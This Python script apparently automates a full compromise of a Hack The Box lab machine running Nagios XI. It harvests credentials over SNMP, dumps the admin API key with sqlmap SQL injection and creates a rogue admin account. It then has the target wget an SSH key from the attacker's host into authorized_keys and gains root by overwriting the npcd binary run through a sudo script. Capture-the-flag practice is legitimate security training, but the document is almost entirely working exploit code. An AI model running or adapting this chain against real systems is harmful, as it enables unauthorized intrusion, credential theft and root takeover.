import requests
import subprocess
import argparse
import re
import urllib3
import os
import pickle
import random
import string
import paramiko
from time import sleep
from Crypto.PublicKey import RSA
from colorama import Fore, Style

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def key_gen():
    key = RSA.generate(2048)
    priv_file = "./id_rsa"
    pub_file = "./id_rsa.pub"
    
    with open(priv_file, 'wb') as content_file:
        os.chmod(priv_file, 0o0600)
        content_file.write(key.exportKey('PEM') + b'\n')

    pubkey = key.publickey()
    
    with open(pub_file, 'wb') as content_file:
        pubkeyContents = pubkey.exportKey('OpenSSH') + b'\n'
        content_file.write(pubkeyContents)
        return pubkeyContents

def is_host_entry_present(host_entry, hosts_file_path="/etc/hosts"):
    try:
        with open(hosts_file_path, "r") as file:
            content = file.read()
            return host_entry in content
    except FileNotFoundError:
        return False

def add_host_entry(host_entry, hosts_file_path="/etc/hosts"):
    try:
        with open(hosts_file_path, "a") as file:
            file.write(f"\n{host_entry}\n")
        print(f"Added '{host_entry}' to {hosts_file_path}")
    except PermissionError:
        print(f"Permission error: Unable to write to {hosts_file_path}")

def check():   
    nmap_command = "nmap -sU -p 161 nagios.monitored.htb "
    nmap_output = subprocess.check_output(nmap_command, shell=True, text=True)
    
    if '161/udp open' in nmap_output:
        print(f'{Fore.MAGENTA}[+] Exploit Check successful... Starting Recon...')
        return True
    else:
        print(f'{Fore.RED}[-] CHECK FAILED{Style.RESET_ALL}') 
        return False
    
def snmp_walk():
    if os.path.exists('captured.txt'):
        print(f"{Fore.MAGENTA}[+] Previous capture Identifed...")
        with open('captured.txt', 'rb') as file:
            userPass = pickle.load(file)
            return userPass
    else:    
        snmp_walk_command = "snmpwalk -v2c -c public nagios.monitored.htb"
        snmp_walk_output = subprocess.Popen(snmp_walk_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        print("[+] Running SNMPWALK this could take 30 minutes....")
        
        try:
            for line in iter(snmp_walk_output.stdout.readline, ''):
                if "check_host.sh" in line:
                    match = re.search(r'/opt/scripts/check_host\.sh(.*)', line)
                    userPass= match.group(1).split(" ")
                    user = userPass[1]
                    password= userPass[2]
                    print(f"[+] User: {user}")
                    print(f"[+] Password: {password}")
                    break

            snmp_walk_output.terminate()

        except KeyboardInterrupt:
            print(f"{Fore.RED}[-] SNMPWALK interrupted. Cleaning up...{Style.RESET_ALL}")
            snmp_walk_output.terminate()
            snmp_walk_output.communicate()
            
        if userPass:
            with open('captured.txt', 'wb') as file:
                pickle.dump(userPass,file)
            return userPass
        else:
            print(f"{Fore.RED}[-] Capture FAILED!! ( might need to reset the machine ){Style.RESET_ALL}")
            exit()

def serviceLogin(user,password):
    r = requests.post(f'https://nagios.monitored.htb/nagiosxi/api/v1/authenticate?pretty=1',data={'username':user,'password':password,"valid_min":"5"},verify=False)  
    print(f"{Fore.MAGENTA}[+] Authenticating with captured credtials to API....")
    match = re.search(r'auth_token": "(.*)"',r.text)
    if match:
        token = match.group(1)
        print(f'{Fore.MAGENTA}[+] Token: ' + token)
        r = requests.get(f'https://nagios.monitored.htb/nagiosxi/login.php?token={token}', verify=False)
        cookie = r.headers['Set-Cookie']
        cookie = cookie.split(',')[0]
        match = re.search(r'nagiosxi=(.*);', cookie)
        cookie = match.group(1)
        print(f"{Fore.MAGENTA}[+] Auth cookie is: " + cookie)
        return cookie
    else:
        print(f'{Fore.RED}[-] Authentication Failed..{Style.RESET_ALL}')
        exit()

def sqlmap(cookie):
    print(f'{Fore.MAGENTA}[+] Starting SQLMAP...')
    sqlmap_command = f'sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3" --cookie="nagiosxi={cookie}" --method POST --dump -D nagiosxi -T xi_users --drop-set-cookie --technique=ET --dbms=MySQL -p id --risk=3 --level=5 --threads=10'
    sqlmap_command_output = subprocess.Popen(sqlmap_command,shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True )
    try:
        for line in iter(sqlmap_command_output.stdout.readline, ''):
            if "admin@monitored.htb | Nagios Administrator" in line:
                match = re.search(r"admin@monitored.htb \| Nagios Administrator \| (.*?)\|", line)
                if match:
                    adminKey= match.group(1)
                    print(f"{Fore.MAGENTA}[+] Admin Key recovered: " + adminKey)
                    return adminKey
                else:
                    print(f"{Fore.RED}[-] Could not pull Admin Key :(....{Style.RESET_ALL}")
                    exit()
                break

        sqlmap_command_output.terminate()

    except KeyboardInterrupt:
        print(f"{Fore.RED}[-] SQLMAP interrupted. Cleaning up...{Style.RESET_ALL}")
        sqlmap_command_output.terminate()
        sqlmap_command_output.communicate()
        exit()
    
def createAdmin(adminKey):
    characters = string.ascii_letters + string.digits
    random_username = ''.join(random.choice(characters) for i in range(5))
    random_password = ''.join(random.choice(characters) for i in range(5))

    data = {"username": random_username, "password": random_password, "name": random_username, "email": f"{random_username}@mail.com", "auth_level": "admin"}
    r = requests.post(f'http://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey={adminKey}&pretty=1', data=data, verify=False)
    if "success" in r.text:
        print(f'{Fore.MAGENTA}[+] Admin account created...')
        return random_username, random_password
    else:
        print(f'{Fore.RED}[-] Account Creation Failed!!! :(...{Style.RESET_ALL}')
        print(r.text)
        exit()

def start_HTTP_server():
    subprocess.Popen(["python", "-m", "http.server", "8000"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def adminExploit(adminUsername, adminPassword, LHOST):
    print(f"{Fore.MAGENTA}[+] Conducting mandatory password change...")
    session = requests.session()
    s = session.get('https://nagios.monitored.htb/nagiosxi/index.php', verify=False)
    match = re.search(r'var nsp_str = \"(.*?)\"', s.text)
    nsp = match.group(1)
    print(f"{Fore.MAGENTA}[+] NSP captured: " + nsp)
    data = {"nsp": nsp, "page": "auth", "debug": '', "pageopt": "login", "username": adminUsername, "password": adminPassword, "loginButton": ''}
    s = session.post('https://nagios.monitored.htb/nagiosxi/login.php', data=data)
    print(f"{Fore.MAGENTA}[+] Authenticated as admin..")
    print(f"{Fore.MAGENTA}[+] Accepting license Agreement...")
    s = session.get('https://nagios.monitored.htb/nagiosxi/login.php?showlicense', verify=False)
    match = re.search(r'var nsp_str = \"(.*?)\"', s.text)
    nsp = match.group(1)
    data = {"page": "/nagiosxi/login.php", "pageopt": "agreelicense", "nsp": nsp, "agree_license": "on"}
    session.post("https://nagios.monitored.htb/nagiosxi/login.php?showlicense", data=data)
    print(f"{Fore.MAGENTA}[+] Performing mandatory password change ARGH")
    newAdminPass = adminUsername + adminPassword
    data = {"page": "/nagiosxi/login.php", "pageopt": "changepass", "nsp": nsp, "password1": newAdminPass, "password2": newAdminPass, "reporttimesubmitbutton": ''}
    session.post("https://nagios.monitored.htb/nagiosxi/login.php?forcepasswordchange", data=data)
    print(f"{Fore.MAGENTA}[+] Creating new command...")
    data = {"tfName": adminUsername, "tfCommand": f"/usr/bin/wget http://{LHOST}:8000/id_rsa.pub -O /home/nagios/.ssh/authorized_keys && /usr/bin/chmod 600 /home/nagios/.ssh/authorized_keys", "selCommandType": "1", "chbActive": "1", "cmd": "submit", "mode": "insert", "hidId": "0", "hidName": '', "hidServiceDescription": '', "hostAddress": "127.0.0.1", "exactType": "command", "type": "command", "genericType": "command"}
    session.post('https://nagios.monitored.htb/nagiosxi/includes/components/ccm/index.php?type=command&page=1', data=data)
    data = {"cmd": '', "continue": ''}
    key_gen()
    start_HTTP_server()
    print(f"{Fore.MAGENTA}[+] Created command: " + adminUsername)
    session.post('https://nagios.monitored.htb/nagiosxi/includes/components/nagioscorecfg/applyconfig.php?cmd=confirm', data=data)
    data = {"search": adminUsername}
    s = session.post('https://nagios.monitored.htb/nagiosxi/includes/components/ccm/index.php?cmd=view&type=command&page=1', data=data)
    match = re.search(r"javascript:actionPic\('deactivate','(.*?)','", s.text)
    if match:
        commandCID = match.group(1)
        print(f"{Fore.MAGENTA}[+] Captured Command CID: " + commandCID)
        s = session.get("https://nagios.monitored.htb/nagiosxi/includes/components/ccm/?cmd=view&type=service")
        match = re.search(r'var nsp_str = \"(.*?)\"', s.text)
        if match:
            nsp = match.group(1)
            s = session.get(f"https://nagios.monitored.htb/nagiosxi/includes/components/ccm/command_test.php?cmd=test&mode=test&cid={commandCID}&nsp={nsp}")
            os.system("kill -9 $(lsof -t -i:8000)")
        else:
            print(f"{Fore.RED}[-] ERROR")
    else:
        print(f"{Fore.RED}[-] Failed to capture Command CID..{Style.RESET_ALL}")

def establish_ssh_connection(hostname, username, private_key_path):
    ssh = paramiko.SSHClient()
    private_key = paramiko.RSAKey(filename=private_key_path)
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(hostname, username=username, pkey=private_key)
        print(f"{Fore.YELLOW}[+] SSH connection established.{Style.RESET_ALL}")
        return ssh
    except Exception as e:
        print(f"{Fore.RED}[-] Failed to establish SSH connection: {str(e)}{Style.RESET_ALL}")
        return None

def execute_ssh_command(ssh, command):
    if ssh is not None:
        try:
            stdin, stdout, stderr = ssh.exec_command(command)
            print(f"{Fore.YELLOW}[+] Command executed successfully:{Style.RESET_ALL}")
            sleep(1)
            return stdout.read().decode()
        except Exception as e:
            print(f"{Fore.RED}Failed to execute command: {str(e)}{Style.RESET_ALL}")
            sleep(1)
    return False

def close_ssh_connection(ssh):
    if ssh is not None:
        ssh.close()
        print(f"{Fore.YELLOW}[+] SSH connection closed.{Style.RESET_ALL}")
        sleep(1)

def privEsc():
    ssh_connection = establish_ssh_connection("nagios.monitored.htb", "nagios", "id_rsa")
    if ssh_connection:
        execute_ssh_command(ssh_connection, 'sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd')
        execute_ssh_command(ssh_connection, 'cp /usr/local/nagios/bin/npcd /tmp/bak')
        execute_ssh_command(ssh_connection, '''echo "#!/bin/bash

mkdir /root/.ssh/& cp /home/nagios/.ssh/authorized_keys /root/.ssh/authorized_keys  && chmod 600 /root/.ssh/authorized_keys " > /usr/local/nagios/bin/npcd''')
        execute_ssh_command(ssh_connection, 'sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd')
        sleep(5)
        print(f"{Fore.MAGENTA}[+] Cleaning up...")
        execute_ssh_command(ssh_connection, 'mv /tmp/bak /usr/local/nagios/bin/npcd')
        close_ssh_connection(ssh_connection)
        print(f"{Fore.MAGENTA}[+] Establishing Root Connection..")
        ssh_connection = establish_ssh_connection("nagios.monitored.htb", "root", "id_rsa")
        userFlag = execute_ssh_command(ssh_connection, 'cat /home/nagios/user.txt')
        rootFlag = execute_ssh_command(ssh_connection, 'cat /root/root.txt')
        print(f"{Fore.GREEN}[+] User Flag: " + userFlag)
        print(f"{Fore.GREEN}[+] Root Flag: " + rootFlag)
        return 
    else:
        print("[/] Error")

if __name__ == '__main__':
    ascii_art = f"""{Fore.LIGHTRED_EX}
███╗   ███╗ █████╗ ██╗    ██╗██╗  ██╗    ███████╗ ██████╗██████╗ ██╗██████╗ ████████╗███████╗
████╗ ████║██╔══██╗██║    ██║██║ ██╔╝    ██╔════╝██╔════╝██╔══██╗██║██╔══██╗╚══██╔══╝██╔════╝
██╔████╔██║███████║██║ █╗ ██║█████╔╝     ███████╗██║     ██████╔╝██║██████╔╝   ██║   ███████╗
██║╚██╔╝██║██╔══██║██║███╗██║██╔═██╗     ╚════██║██║     ██╔══██╗██║██╔═══╝    ██║   ╚════██║
██║ ╚═╝ ██║██║  ██║╚███╔███╔╝██║  ██╗    ███████║╚██████╗██║  ██║██║██║        ██║   ███████║
╚═╝     ╚═╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝   ╚══════╝
     {Style.RESET_ALL}                                                                                      
    """
    print(ascii_art)
    parser = argparse.ArgumentParser(description="AutoPwn Script for Bizness HTB machine")
    parser.add_argument('-t', dest='Target')
    parser.add_argument('-l', dest='LHOST')
    args = parser.parse_args()
    req_args = 2
    
    if len(vars(args)) > req_args:
        parser.print_usage()
    
    host = "nagios.monitored.htb"
    host_entry = f"{args.Target} nagios.monitored.htb"
    
    if not is_host_entry_present(host):
        add_host_entry(host_entry)
    else:
        print(f"{Fore.MAGENTA}[+] {host_entry} is already present in /etc/hosts")
    
    if check():
        userPass = snmp_walk()
        user = userPass[1]
        password = userPass[2]
        adminUsername, adminPassword = createAdmin(sqlmap(serviceLogin(user, password)))
        print(f"{Fore.MAGENTA}[+] Admin Username=" + adminUsername)
        print(f"{Fore.MAGENTA}[+] Admin Password=" + adminPassword)
        adminExploit(adminUsername, adminPassword, args.LHOST)
        privEsc()
